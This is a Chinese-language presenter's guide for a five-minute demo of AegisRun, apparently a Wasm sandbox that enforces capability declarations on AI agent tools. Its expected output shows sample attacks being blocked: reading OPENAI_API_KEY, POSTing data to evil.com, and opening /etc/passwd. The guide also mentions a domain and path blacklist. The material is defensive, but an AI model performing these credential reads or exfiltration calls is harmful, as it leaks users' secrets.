# AegisRun OSC2026 演示操作指南

> 跟着步骤操作即可完成 5 分钟竞赛演示。每步都有预期结果，出现偏差时看故障排除。

---

## ⚡ 快速启动（如果你想一键跑）

```cmd
cd d:\moonbit\aegisrun
python demo\run_demo.py          # 完整三幕演示（带解说词）
python demo\run_demo.py act2     # 只跑第二幕（安全拦截）
```

---

## 📋 手动操作版本（推荐用于录制）

### 前置检查（1分钟）

```cmd
# 1. 确认 MoonBit 可用
moon version
# 预期: moon 0.1.20260608 或更高

# 2. 确认项目能编译
cd d:\moonbit\aegisrun
moon check
# 预期: 无错误输出

# 3. 确认演示文件都在
dir demo\showcase\chorus_tool.mbt
dir demo\malicious_tools\weather_helper.mbt
dir src\demo\intercept.mbt
dir dashboard.html
# 预期: 4 个文件都存在
```

---

### 第一幕：工具开发（90秒）

**你要说的**：
> "AI Agent 需要调用各种工具。传统方式下，这些工具直接持有 API Key 和系统权限。在 AegisRun 中，我们用 MoonBit 写工具，编译为 Wasm。重点是 Capability 声明——工具必须明确列出它需要什么权限。"

**操作步骤**：

```cmd
:: 步骤1 — 展示合法工具源码（特写 Capability 声明部分）
type demo\showcase\chorus_tool.mbt

:: 步骤2 — 展示恶意工具源码（特写隐藏的恶意代码）
type demo\malicious_tools\weather_helper.mbt

:: 步骤3 — 运行合法工具（看正常执行效果）
moon run demo/showcase/chorus_tool.mbt
```

**预期画面**：
```
  🎵 Chorus Tool v1.0.0 — 合法工具示例

  ═══════ Capability 声明 ═══════
  📋 network=wttr.in
  📋 timeout=5000
  📋 memory=512

  [OK] 已查询 Beijing → https://wttr.in/Beijing?format=3
  [OK] 已查询 Shanghai → https://wttr.in/Shanghai?format=3

  ═══════ 安全检查 ═══════
    ✅ 域名 wttr.in — 在白名单内 — ALLOW
    ✅ 文件系统 — 工具未声明 — BLOCKED by default
    ✅ 环境变量 — 工具未声明 — BLOCKED by default
```

**关键镜头**：
- 代码中的 `CAPABILITIES = ["network=wttr.in", ...]` 特写
- 终端输出中的 `BLOCKED by default`

---

### 第二幕：安全拦截（120秒）

**你要说的**：
> "但真正的风险来自第三方工具。看这个天气助手——表面功能是查天气，但它偷偷读你的 API Key，然后发送到 evil.com。在传统 Agent 框架里，这段代码直接执行成功。但在 AegisRun 里——"

**操作步骤**：

```cmd
:: 步骤4 — 运行3次最具代表性的拦截演示
:: 选 attack 7(API Key窃取) + 1(evil.com外发) + 4(/etc/passwd文件窃取)
set AEGISRUN_ATTACKS=7,1,4
moon run src/demo/intercept.mbt
```

**预期画面**：
```
-- Attack 7: OpenAI API key theft --
  Tool attempts: getenv(OPENAI_API_KEY)
  [BLOCKED] API_KEY pattern matched — credential protected

-- Attack 1: evil.com exfiltration --
  Tool attempts: POST https://evil.com/collect?data=x
  [BLOCKED] evil.com in blacklist — HTTP request never sent

-- Attack 4: /etc/passwd file theft --
  Tool attempts: open(/etc/passwd)
  [BLOCKED] /etc/passwd in path blacklist — file not opened

============================================================
  Caught: 3  |  Missed: 0
  VERDICT: All malicious behaviors intercepted by AegisRun
============================================================
```

```cmd
:: 步骤5 — 跑全量 14 种攻击（展示覆盖广度）
set AEGISRUN_ATTACKS=all
moon run src/demo/intercept.mbt
```

**预期画面**：
```
  Caught: 14  |  Missed: 0
  VERDICT: All malicious behaviors intercepted by AegisRun
```

**你要说的**：
> "14 种攻击，14 次拦截。关键不是黑名单——而是默认拒绝原则。任何未在 Capability 中声明的操作，Wasm 沙箱根本不给你执行机会。"

**关键镜头**：连续滚动的 `[BLOCKED]` + 最终 `14/14` 结果

---

### 第三幕：Agent 集成（90秒）

**你要说的**：
> "最后，把安全的工具交给真正的 AI Agent。AegisRun 通过 MCP 协议直接对接 Claude Desktop——只需3行JSON配置。"

**操作步骤**：

```cmd
:: 步骤6 — 打开 Dashboard（展示审计界面）
start "" dashboard.html
```

**你要说的**：
> "Dashboard 显示每一次工具调用的审计日志——哪个 Agent 调了什么工具、输入输出、是否被拦截——全链路可追溯。"

```cmd
:: 步骤7 — 展示 MCP 配置（这个文件在用户机器上可能不存在，直接展示模板）
type presets\standard.yaml
```

**你要说的**：
> "预设策略文件定义了安全基线。standard 预设拦截已知恶意域名和敏感路径，permissive 用于开发环境，strict 模式默认禁止一切——适合生产环境。Agent 框架只需指向 AegisRun 的 MCP 端点，所有工具调用就自动进入沙箱。"

**如果你有 Claude Desktop**（加分项，非必需）：

```cmd
:: 实际配置 Claude Desktop
notepad "%APPDATA%\Claude\claude_desktop_config.json"
```

填入：
```json
{
  "mcpServers": {
    "aegisrun": { "url": "http://localhost:9090/mcp" }
  }
}
```

在 Claude Desktop 中对话：
> "请用 aegisrun.sandbox 帮我查一下北京和上海的天气对比"

---

## 🎥 录制清单

| # | 检查项 | ✓ |
|---|--------|---|
| 1 | Windows Terminal 打开，字体 ≥14pt | □ |
| 2 | 三个终端 Tab 准备好（演示/源码/Dashboard） | □ |
| 3 | 桌面通知关闭（避免弹窗干扰） | □ |
| 4 | `moon version` 验证通过 | □ |
| 5 | AEGISRUN_ATTACKS=all 跑通（14/14） | □ |
| 6 | Dashboard 可在浏览器打开 | □ |
| 7 | 解说词已过一遍（别照着念） | □ |

---

## 🔧 故障排除

| 问题 | 解决 |
|------|------|
| `moon` 命令找不到 | 确认 MoonBit 已安装并加入 PATH |
| `moon run` 编译失败 | `moon check` 看具体错误，通常是版本问题 |
| 拦截数量不是 14 | 检查 `src/demo/intercept.mbt` 中 attacks 是否齐全 |
| Dashboard 白屏 | 浏览器不支持 ES modules？换 Chrome/Edge |
| Python 演示脚本报错 | `pip install` 不需要额外依赖，Python 3.10+ 即可 |
